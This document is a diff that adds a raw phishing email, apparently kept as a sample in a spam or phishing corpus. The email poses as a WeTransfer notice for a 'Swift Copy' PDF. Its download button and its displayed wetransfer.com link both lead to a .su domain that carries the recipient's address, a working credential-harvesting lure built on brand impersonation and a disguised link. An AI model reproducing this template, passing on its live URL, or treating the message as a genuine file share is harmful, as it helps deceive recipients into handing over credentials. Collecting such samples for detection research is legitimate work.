@@ -1,0 +1,309 @@
+Return-Path: info30@startriphike.org
+Delivered-To: jose@monkey.org
+X-FDA: 84102103260.27.59B1F95
+Received: from startriphike.org (startriphike.org [85.120.228.58])
+	by imf20.b.hostedemail.com (Postfix) with ESMTP id 050646000E
+	for <jose@monkey.org>; Wed, 12 Nov 2025 13:55:48 +0000 (UTC)
+Authentication-Results: imf20.b.hostedemail.com;
+	dkim=pass header.d=startriphike.org header.s=20251028 header.b=nmzDSCZ7;
+	spf=pass (imf20.b.hostedemail.com: domain of info30@startriphike.org
+ designates 85.120.228.58 as permitted sender)
+ smtp.mailfrom=info30@startriphike.org;
+	dmarc=pass (policy=none) header.from=startriphike.org
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1762955749;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=7e1UBYyyLwXf45qwviixfkPJGzutq/uXe9T72WQTmS0=;
+	b=vVIlEiYm5rXr+Zsy0jDwdarGToCTEVJARjbMkpAZnujUkYMnSH3nvOS5uXahmD09KIXsVb
+	0BRTFUyhuwWd/9SYQY4Rj60077l6cc8hC7U8JfGMcAkWwn38I0G/0aHl50rsQpNvWWF+5B
+	x1xLNfKwD7fYDBNwx9irG6PxrKj1f0o=
+ARC-Authentication-Results: i=1;
+	imf20.b.hostedemail.com;
+	dkim=pass header.d=startriphike.org header.s=20251028 header.b=nmzDSCZ7;
+	spf=pass (imf20.b.hostedemail.com: domain of info30@startriphike.org
+ designates 85.120.228.58 as permitted sender)
+ smtp.mailfrom=info30@startriphike.org;
+	dmarc=pass (policy=none) header.from=startriphike.org
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1762955749; a=rsa-sha256;
+	cv=none;
+	b=8ldJ5B3QcPg/e59LYvWjj5Y3AelbrUF4Y4mIzoiv7jdSHqg+NErPcETNoLtOHwMRLCPxc5
+	4MB8K+04fQpiuZS1HHxAPLmNFKbB6Ra6/xT1UviWKuI/x1vf2Cy9LfIKsv8cTRsia/5ael
+	5uy+HfpR8O0tRWA4tyxnhnAudeeiIX0=
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=startriphike.org;
+	s=20251028; t=1762867127;
+	bh=7e1UBYyyLwXf45qwviixfkPJGzutq/uXe9T72WQTmS0=;
+	h=From:To:Subject:Date:From;
+	b=nmzDSCZ7ViD+OlDORvGSZ3YJMpQ+xZRxPMUzJYuHJepOR2Wy9FY05RIMQzpgXglE9
+	 G9wpfrQX7MbWS9jCTUdnv09U8EELDAzLYton3uUCTBAYDu9O+QffzcvxmJoGlsanpl
+	 XdgrCgdpphr9fRpYM42o7teGYQwEC/sKFD3uacIoVD3tbSNElTWhpEsvRsHJYUFPhL
+	 Vw5voF+ZW1+9sweBu8L0RCKPwyWg2Lqa42XnAhzaB0+MuR8jNROgZi0U8Z6ll0COyr
+	 yVFnBIWyCGPnEdm0cBIESUeSj6MMotOQsBIUDoumCIPMDvvabkkUtn74eJgl6SZq4o
+	 0qcB0aFM+BtXg==
+Received: from 107-174-245-76-host.colocrossing.com (unknown [107.174.245.76])
+	by startriphike.org (Postfix) with ESMTPSA id 182075F157
+	for <jose@monkey.org>; Tue, 11 Nov 2025 13:18:46 +0000 (UTC)
+From: WeTransfer <info30@startriphike.org>
+To: jose@monkey.org
+Subject: You have received a Document Via "WeTransfer"
+Date: 11 Nov 2025 05:18:46 -0800
+Message-ID: <20251111051846.F08DFB00C0BD0F22@startriphike.org>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Queue-Id: 050646000E
+X-Rspam-User: 
+X-Stat-Signature: j8g3xtb7fqak66yznamyodzam4qfzgki
+X-Spam-Status: Yes, score=29.10
+X-Rspamd-Server: rspam02
+X-HE-Tag: 1762955748-767883
+X-HE-Meta: 
+ U2FsdGVkX1/LTVgsNTlHiQEPpsnA0hGU2whgJvliNALuWRF6n6hioQcS8oeM4drLdVxUycFBri2hBQdzeBgezqiphrv15Zzac7cCizfGGi46TD6bL2nYfZ9uw4sSSSeRoVpK5YGoA6vTG0iIl34B6WYGPaLhz3bNFd2MBMFSo1azsgqx0sDNXFjfPHrYa70JLLxRJuQslxghfUY5LPoQ8BhfkBpZm3LnINk0fzl0tCZWRWJCPO1k/HjLIE/ezykwuOr7fgdWqF/mVb9Y9K0DmSMu1IaMJKevoTGoZQ6JPbNGUMzCPR8OtCe7noP/NJQPoaH3F3SCK8Pg7XBKsZNk49jqjpPE1oA3LnOVpq53oGMNqSQi7dYMEvnqkX1tsUg2CyKlvuRqxtADHA8LInJCebdEzULE6pmFNggjIGrhKWc6U8AXAF1vVyP9IZxlm3P+6ko+RBnePuxjAO6u6J1Gj5O+jz81oY/wvnWNmzcH1Lxm+i/Yt+b2TvldmkfbG9OlSSaJynAdOxiaQmEE9xjryTmC10MBIFuej5VzNIWDUna7R2krrbYPE4TBAj/9/49VxAvX/pj6jvyqiiySR/pDNHsM0rcW8pwHSBNE3vL8hJkrbLpAvXogOOGIhQqMzl1o1LCB2N4nzTyZAVH2w2ZcxtE306WUh9m9aMzH/5eJKHi3+nS9vCLNaXSTxvrz+huuLGNtRGvzcV6d40UW9jLVroXnN45/j4py6XM79kOE+3ZZ4AmbCFZ4/1GYkm2dHa9C9qURFxktcq80S1zKPYV17zJbdp3Dakg60cjKoxhS/q6nJluMKxRUme86Dna/hZzVoNAttjWhSnHnz9mddDy7S3jkC+BVd/ppweRMHgS/5d/EuZFOdwk9fhkMnO0cxefWI/FO/yU/BUCXmebLY+L3k9KQxffVx0nGAUWy3SHKFkQJ0yweCBmHAaBdaFp071RIQqHupsmxX2o1aYeIRXBTX9vnM73
+ 6mAy/NCmFxGc6Yy/a2/aatWKel1WwysUdKjghdKmE6p1W7+mnFtTz9Cs0IjsEIAaWDwvOjSRaxL7zoOE3BvObAFGPGKTiomMsS4ETeiXyrheulXZ10uSH2bTu8TKTMrojXrbnVNrRd4Rxi1Bfp97rhAbDk1HnNCNxnelWeMoq0Q/cc6FHFuoJ/igjS+bIm/HXt8Jhq7u+uiS4O59sTVigIA1Zr776yZK9NC7lhpvR7gVsj2SNEDenNjxCTIQAoUjzHriAF22sds/Cd+lxzCNNEYnXnrzjt1MNcvMushM/i7JvuiAiZe7EGrPJJPmPz2CylH49ZxzEFiIWVEAaXYj5VVi8cq/1IAWKvBHnuNsmTIoFrdqgHFuOlJz4dv2FQxYLrBlDAaaIvZeQ3pG45bGCwa0nwO/WxrpJ0L/zsSF+qPNx2xwvf17HXA+zLvf7zlowUkM88hcu+Po9WdvUzwJi5lUNpUrUm93yGOuC7AyiXcmnWrD7jsP8kQlw5dRe2z1MzUjNkPn7w4yuyI3KpgG9aXnJFfY/d9wP4diq
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 432
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body><div>
+<table style=3D"margin: 0px; padding: 0px; width: 599px; height: 55px; colo=
+r: rgb(44, 54, 58); text-transform: none; letter-spacing: normal; font-fami=
+ly: Roboto, sans-serif; font-size: 14px; font-style: normal; font-weight: 4=
+00; word-spacing: 0px; white-space: normal; border-collapse: collapse; tabl=
+e-layout: fixed; border-spacing: 0px; orphans: 2; widows: 2; font-variant-l=
+igatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px=
+; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;" border=3D"=
+0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 55px 0px 0=
+px; width: 599px; height: 55px; box-sizing: border-box;">&nbsp;</td>
+</tr>
+</tbody>
+</table>
+<table style=3D"margin: 0px auto; padding: 0px; width: 599px; color: rgb(44=
+, 54, 58); text-transform: none; letter-spacing: normal; font-family: Robot=
+o, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; word-=
+spacing: 0px; white-space: normal; border-collapse: collapse; table-layout:=
+ fixed; border-spacing: 0px; orphans: 2; widows: 2; background-color: rgb(2=
+55, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; -=
+webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial;" bgcolor=3D"#ffffff" border=3D"0" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; width=
+: 599px; box-sizing: border-box;">
+<table style=3D"margin: 0px; padding: 0px; width: 599px; border-collapse: c=
+ollapse; table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacin=
+g=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; width=
+: 599px; box-sizing: border-box;">
+<table style=3D"margin: 0px; padding: 0px; width: 599px; border-collapse: c=
+ollapse; table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacin=
+g=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td align=3D"center" valign=3D"top" style=3D'margin: 0px; padding: 60px 80p=
+x 0px; width: 440px; color: rgb(23, 24, 26); line-height: 30px; font-family=
+: "Segoe UI", "SanFrancisco Display", Arial, sans-serif; font-size: 26px; b=
+ox-sizing: border-box;'>jose@monkey.org<br style=3D"box-sizing: border-box;=
+"><span style=3D"font-size: large; box-sizing: border-box;">You have receiv=
+ed a Document Via "WeTransfer"<br style=3D"box-sizing: border-box;"><span s=
+tyle=3D"font-family: Segoe UI; box-sizing: border-box;">
+Ref : Swift Copy</span></span></td>
+</tr>
+<tr style=3D"box-sizing: border-box;">
+<td align=3D"center" valign=3D"top" style=3D'margin: 0px; padding: 20px 80p=
+x 0px; width: 440px; color: rgb(106, 109, 112); line-height: 23px; font-fam=
+ily: "Fakt Pro", "Segoe UI", "SanFrancisco Display", Arial, sans-serif; box=
+-sizing: border-box;'>1 item, 19.6 KB in total &#12539; Expires on 12th of&=
+nbsp;Nov, 2025</td>
+</tr>
+<tr style=3D"box-sizing: border-box;">
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 40px 160px=
+; width: 280px; box-sizing: border-box;">
+<table style=3D"margin: 0px; padding: 0px; width: 280px; border-collapse: c=
+ollapse; table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacin=
+g=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; width=
+: 280px; box-sizing: border-box;">
+<a style=3D'padding: 15px 20px; border-radius: 25px; text-align: center; co=
+lor: rgb(255, 255, 255); font-family: "Fakt Pro Medium", "Segoe UI", "SanFr=
+ancisco Display", Arial, sans-serif; display: block; box-sizing: border-box=
+; background-color: rgb(82, 104, 255); text-decoration-line: none;' href=3D=
+"https://bdhcb893-hdb028.inducedflamecon.su/?gsd=3Djose@monkey.org&amp;pui=
+=3DpWG9dZfMI0xntKWC2W1ErETAj0Y1jx5bPIk2yQI0gMs=3D" target=3D"_blank" rel=3D=
+"noreferrer"><span style=3D"box-sizing: border-box;">
+Get your files</span></a></td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr style=3D"box-sizing: border-box;">
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 40px 80px =
+0px; width: 440px; box-sizing: border-box;">
+<table style=3D"margin: 0px; padding: 0px; width: 440px; border-collapse: c=
+ollapse; table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacin=
+g=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px; width=
+: 440px; line-height: 0; font-size: 1px; border-bottom-color: rgb(244, 244,=
+ 244); border-bottom-width: 2px; border-bottom-style: solid; box-sizing: bo=
+rder-box;">&nbsp;</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr style=3D"box-sizing: border-box;">
+<td align=3D"left" valign=3D"top" style=3D'margin: 0px; padding: 50px 80px =
+0px; width: 440px; color: rgb(121, 124, 127); line-height: 24px; font-famil=
+y: "Fakt Pro", "Segoe UI", "SanFrancisco Display", Arial, sans-serif; box-s=
+izing: border-box;'><span style=3D'color: rgb(23, 24, 26); font-family: "Se=
+goe UI", "SanFrancisco Display", Arial, sans-serif; font-size: 18px; box-si=
+zing: border-box;'>Download link</span><br style=3D"box-sizing: border-box;=
+">
+<span style=3D"color: rgb(82, 104, 255); box-sizing: border-box; overflow-w=
+rap: break-word;"><a href=3D"https://bdhcb893-hdb028.inducedflamecon.su/?gs=
+d=3Djose@monkey.org&amp;pui=3DpWG9dZfMI0xntKWC2W1ErETAj0Y1jx5bPIk2yQI0gMs=
+=3D" target=3D"_blank" rel=3D"noreferrer">https:\\wetransfer.com\downloads\=
+efa3649e99181c00d3023755e15295<wbr style=3D"box-sizing: border-box;">1e2023=
+0907141626</a></span></td>
+</tr>
+<tr style=3D"box-sizing: border-box;">
+<td align=3D"left" valign=3D"top" style=3D'margin: 0px; padding: 50px 80px =
+0px; width: 440px; color: rgb(121, 124, 127); line-height: 24px; font-famil=
+y: "Fakt Pro", "Segoe UI", "SanFrancisco Display", Arial, sans-serif; box-s=
+izing: border-box;'><span style=3D'color: rgb(23, 24, 26); font-family: "Se=
+goe UI", "SanFrancisco Display", Arial, sans-serif; font-size: 18px; box-si=
+zing: border-box;'>1&nbsp;item</span></td>
+</tr>
+<tr style=3D"box-sizing: border-box;">
+<td align=3D"left" valign=3D"top" style=3D'margin: 0px; padding: 0px 80px 5=
+0px; width: 440px; color: rgb(121, 124, 127); line-height: 24px; font-famil=
+y: "Fakt Pro", "Segoe UI", "SanFrancisco Display", Arial, sans-serif; box-s=
+izing: border-box;'>
+<div style=3D'color: rgb(23, 24, 26); font-family: "Segoe UI", "SanFrancisc=
+o Display", Arial, sans-serif; font-size: 18px; box-sizing: border-box;'>&n=
+bsp;</div>
+<div style=3D"padding: 9px 0px 7px; border-bottom-color: rgb(244, 244, 244)=
+; border-bottom-width: 1px; border-bottom-style: none; box-sizing: border-b=
+ox;">
+<div style=3D"color: rgb(23, 24, 26); line-height: 16px; box-sizing: border=
+-box;"><span style=3D'color: rgb(106, 109, 112); font-family: "fakt pro", "=
+segoe ui", "sanfrancisco display", arial, sans-serif; font-size: 12px;'>TT6=
+6876.pdf</span><br style=3D'color: rgb(106, 109, 112); font-family: "fakt p=
+ro", "segoe ui", "sanfrancisco display", arial, sans-serif; font-size: 12px=
+;'>
+<span style=3D'color: rgb(106, 109, 112); font-family: "fakt pro", "segoe u=
+i", "sanfrancisco display", arial, sans-serif; font-size: 12px;'>19.6 KB.PD=
+F</span><br style=3D'color: rgb(106, 109, 112); font-family: "fakt pro", "s=
+egoe ui", "sanfrancisco display", arial, sans-serif; font-size: 12px;'></di=
+v>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+<table style=3D"margin: 0px auto; padding: 0px; width: 599px; color: rgb(44=
+, 54, 58); text-transform: none; letter-spacing: normal; font-family: Robot=
+o, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; word-=
+spacing: 0px; white-space: normal; border-collapse: collapse; table-layout:=
+ fixed; border-spacing: 0px; orphans: 2; widows: 2; font-variant-ligatures:=
+ normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-de=
+coration-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;" border=3D"0" cellspacing=3D"0" ce=
+llpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 2px 0px 0p=
+x; width: 599px; box-sizing: border-box;">
+<table style=3D"margin: 0px; padding: 0px; width: 599px; border-collapse: c=
+ollapse; table-layout: fixed; border-spacing: 0px;" bgcolor=3D"#ffffff" bor=
+der=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; padding: 0px 20px; =
+width: 560px; box-sizing: border-box;">
+<table style=3D"margin: 0px; padding: 0px; width: 560px; border-collapse: c=
+ollapse; table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacin=
+g=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td align=3D"center" valign=3D"top" style=3D'margin: 0px; padding: 13px 0px=
+; width: 560px; color: rgb(121, 124, 127); line-height: 24px; font-family: =
+"Fakt Pro", "Segoe UI", "SanFrancisco Display", Arial, sans-serif; font-siz=
+e: 12px; box-sizing: border-box;'>
+<p style=3D"margin: 0px; padding: 0px; box-sizing: border-box;">To make sur=
+e our emails arrive, please add<span style=3D"box-sizing: border-box;">&nbs=
+p;</span>&nbsp;<span style=3D"box-sizing: border-box;">noreply@wetransfer.c=
+om</span><span style=3D"box-sizing: border-box;">&nbsp;</span>to<span style=
+=3D"box-sizing: border-box;">&nbsp;</span>&nbsp;your contacts.</p>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+<table style=3D"margin: 0px; padding: 0px; width: 599px; color: rgb(44, 54,=
+ 58); text-transform: none; letter-spacing: normal; font-family: Roboto, sa=
+ns-serif; font-size: 14px; font-style: normal; font-weight: 400; word-spaci=
+ng: 0px; white-space: normal; border-collapse: collapse; table-layout: fixe=
+d; border-spacing: 0px; orphans: 2; widows: 2; font-variant-ligatures: norm=
+al; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorat=
+ion-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;" border=3D"0" cellspacing=3D"0" ce=
+llpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td align=3D"center" valign=3D"top" style=3D'margin: 0px; padding: 30px 20p=
+x; width: 560px; text-align: center; color: rgb(121, 124, 127); line-height=
+: 23px; font-family: "Fakt Pro", "Segoe UI", "SanFrancisco Display", Arial,=
+ sans-serif; font-size: 12px; box-sizing: border-box;'><span style=3D"box-s=
+izing: border-box;">About WeTransfer</span><span style=3D"box-sizing: borde=
+r-box;">&nbsp;</span><span style=3D"box-sizing: border-box;">&nbsp;&nbsp;&#=
+12539;&nbsp;&nbsp;</span>
+ <span style=3D"box-sizing: border-box;">&nbsp;</span>&nbsp;<span style=3D"=
+box-sizing: border-box;">Help</span><span style=3D"box-sizing: border-box;"=
+>&nbsp;</span><span style=3D"box-sizing: border-box;">&nbsp;&nbsp;&#12539;&=
+nbsp;&nbsp;</span><span style=3D"box-sizing: border-box;">&nbsp;</span>&nbs=
+p;<span style=3D"box-sizing: border-box;">Legal</span><span style=3D"box-si=
+zing: border-box;">&nbsp;</span><span style=3D"box-sizing: border-box;">&nb=
+sp;&nbsp;&#12539;&nbsp;&nbsp;</span>
+<span style=3D"box-sizing: border-box;"> &nbsp;</span>&nbsp;<span style=3D"=
+box-sizing: border-box;">Report this transfer as spam</span></td>
+</tr>
+</tbody>
+</table>
+</div>
+</body></html>
+
